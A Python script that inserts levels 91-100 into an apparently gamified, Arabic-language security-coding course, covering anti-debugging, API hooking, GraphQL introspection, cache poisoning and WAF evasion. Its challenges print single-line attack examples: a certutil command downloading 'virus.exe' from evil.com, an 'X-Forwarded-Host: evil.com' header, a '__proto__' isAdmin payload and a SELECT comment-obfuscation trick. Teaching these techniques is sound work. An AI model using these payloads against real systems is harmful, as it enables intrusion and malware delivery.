import codecs

with codecs.open(r'D:\abdo_portfolio\generate_engine_ide.py', 'r', 'utf-8') as f:
    content = f.read()

new_chapters = r'''  },
  {
    chapter: "Chapter 41: Advanced Reverse Engineering",
    levels: [
      {
        id: "l91",
        title: "فحص بيئة التنقيح (Anti-Debugging)",
        theory: `<h1>Level 91: اكتشاف المحللين</h1>
          <p>الفيروسات المتقدمة تفحص ما إذا كان هناك باحث أمني يراقبها باستخدام منقح (Debugger). في الويندوز، نستخدم دالة <code>IsDebuggerPresent</code> من <code>kernel32.dll</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع القيمة التي ترجعها الدالة عند عدم وجود منقح: <code>0</code>.</p>
          </div>`,
        initialCode: `# import ctypes\n# is_debug = ctypes.windll.kernel32.IsDebuggerPresent()\n\n# اطبع النتيجة المتوقعة لغياب المنقح\n`,
        validate: (out) => out.includes("0")
      },
      {
        id: "l92",
        title: "خطافات النظام (API Hooking)",
        theory: `<h1>Level 92: اعتراض الدوال</h1>
          <p>تقنية الـ Hooking تعني اعتراض استدعاء نظام (مثل دالة كتابة الملفات) وتحويله للكود الخاص بك أولاً للتجسس عليه.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع جملة: <code>Function Hooked Successfully</code>.</p>
          </div>`,
        initialCode: `# اطبع الرسالة لتأكيد اعتراض الدالة\n`,
        validate: (out) => out.includes("Function Hooked Successfully") || out.includes("Hooked")
      }
    ]
  },
  {
    chapter: "Chapter 42: Modern Web Attacks",
    levels: [
      {
        id: "l93",
        title: "استكشاف GraphQL",
        theory: `<h1>Level 93: ثغرات الـ GraphQL</h1>
          <p>أغلب التطبيقات الحديثة تستخدم GraphQL. ثغرة <code>Introspection</code> تسمح لك باستخراج خريطة قاعدة البيانات بالكامل بإرسال استعلام <code>__schema</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع الاستعلام الخطير: <code>{ __schema { types { name } } }</code></p>
          </div>`,
        initialCode: `# اطبع الـ Query الخاص باستخراج الجداول\n`,
        validate: (out) => out.includes("__schema") && out.includes("types")
      },
      {
        id: "l94",
        title: "تسميم الذاكرة المخبئية (Cache Poisoning)",
        theory: `<h1>Level 94: Web Cache Poisoning</h1>
          <p>يمكن للمهاجم إرسال هيدر مزيف (مثل <code>X-Forwarded-Host: evil.com</code>) ليحتفظ به سيرفر التخزين المؤقت، فيصاب كل زوار الموقع بهذا الرابط الخبيث.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك قاموس الهيدرز، أضف مفتاح <code>"X-Forwarded-Host"</code> وقيمته <code>"evil.com"</code> ثم اطبع القاموس.</p>
          </div>`,
        initialCode: `headers = {"User-Agent": "Hacker"}\n\n# أضف الهيدر الخبيث ثم اطبع القاموس\n`,
        validate: (out) => out.includes("X-Forwarded-Host") && out.includes("evil.com")
      },
      {
        id: "l95",
        title: "تلوث النموذج (Prototype Pollution)",
        theory: `<h1>Level 95: تدمير منطق الجافاسكربت</h1>
          <p>حقن خصائص في <code>__proto__</code> لكائنات الـ JSON قد يؤدي لانهيار المنطق البرمجي (Prototype Pollution) في سيرفرات Node.js.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع الـ Payload التالي: <code>{"__proto__": {"isAdmin": true}}</code></p>
          </div>`,
        initialCode: `# اطبع نص الـ Payload المطلوب\n`,
        validate: (out) => out.includes("__proto__") && out.includes("isAdmin")
      }
    ]
  },
  {
    chapter: "Chapter 43: Bypassing Advanced Security",
    levels: [
      {
        id: "l96",
        title: "تخطي جدار الحماية (WAF Evasion)",
        theory: `<h1>Level 96: خداع الـ WAF</h1>
          <p>جدران الحماية (WAF) تمنع كلمات مثل <code>SELECT</code>. يمكنك تخطيها بالمسافات المخفية، التعليقات <code>/*!SELECT*/</code>، أو التشفير.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>استخدم دالة <code>replace()</code> لتحويل كلمة <code>SELECT</code> إلى <code>S/**/ELECT</code> في المتغير، ثم اطبع المتغير.</p>
          </div>`,
        initialCode: `query = "SELECT * FROM users"\n\n# قم بتشويش الكلمة واطبع النتيجة\n`,
        validate: (out) => out.includes("S/**/ELECT")
      },
      {
        id: "l97",
        title: "الهجوم بأسلحة النظام (LOLBins)",
        theory: `<h1>Level 97: Living Off The Land</h1>
          <p>بدلاً من تحميل فيروسات خارجية قد يكتشفها الـ Antivirus، الهاكرز يستخدمون برامج الويندوز الأصلية مثل <code>certutil.exe</code> لتحميل الملفات الخبيثة من الإنترنت.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع أمر التحميل الخبيث: <code>certutil.exe -urlcache -split -f http://evil.com/virus.exe</code></p>
          </div>`,
        initialCode: `# اطبع الأمر المطلوب\n`,
        validate: (out) => out.includes("certutil.exe -urlcache") && out.includes("evil.com")
      },
      {
        id: "l98",
        title: "تعدد الأشكال (Polymorphic Shellcode)",
        theory: `<h1>Level 98: الفيروس المتغير</h1>
          <p>الفيروس متعدد الأشكال يغير كود التشفير الخاص به في كل مرة يُصيب جهازاً جديداً، مما يجعل توقيعه (Signature) مختلفاً ويعجز الـ Antivirus عن اكتشافه.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Polymorphic Engine Activated</code></p>
          </div>`,
        initialCode: `# اطبع الرسالة\n`,
        validate: (out) => out.includes("Polymorphic Engine Activated")
      }
    ]
  },
  {
    chapter: "Chapter 44: The End of the Matrix",
    levels: [
      {
        id: "l99",
        title: "بوابة الهروب (The Red Pill)",
        theory: `<h1>Level 99: الحبة الحمراء</h1>
          <p>هذه هي الخطوة الأخيرة قبل إتمام 100 مستوى. أنت الآن تفهم كل تقنيات الاختراق وتخطي الحماية. الخيار لك: أن تستخدمها للتخريب، أو لتأمين الأنظمة وتغيير العالم.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>I CHOOSE THE RED PILL</code></p>
          </div>`,
        initialCode: `# اتخذ قرارك\n`,
        validate: (out) => out.includes("RED PILL") || out.includes("RED")
      },
      {
        id: "l100",
        title: "The Supreme Architect",
        theory: `<h1>Level 100: مهندس المصفوفة</h1>
          <p>مرحى لك! 100 مستوى كامل. لقد أثبت أنك لست مجرد هاكر عابر.. لقد أصبحت <strong>مهندس المصفوفة (The Supreme Architect)</strong>.</p>
          <p>لا يوجد شيء آخر في هذه اللعبة. لقد ختمت منهج بايثون الأمني بالكامل. الآن حان الوقت لكتابة التاريخ في الواقع الملموس.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 الختم الأسطوري النهائي</div>
            <p>اطبع بكل فخر: <code>100 LEVELS CLEARED. I AM THE SUPREME ARCHITECT.</code></p>
          </div>`,
        initialCode: `# الكلمة الأخيرة لك أيها الأسطورة.\n`,
        validate: (out) => out.includes("100") && out.includes("ARCHITECT")
      }
    ]
  }
];'''

if 'id: "l100"' not in content:
    target = '    ]\n  }\n];'
    content = content.replace('    ]\n  }\n];', '    ]\n' + new_chapters)
    
    with codecs.open(r'D:\abdo_portfolio\generate_engine_ide.py', 'w', 'utf-8') as f:
        f.write(content)
    print('Added levels 91-100 successfully!')
else:
    print('Levels already added.')
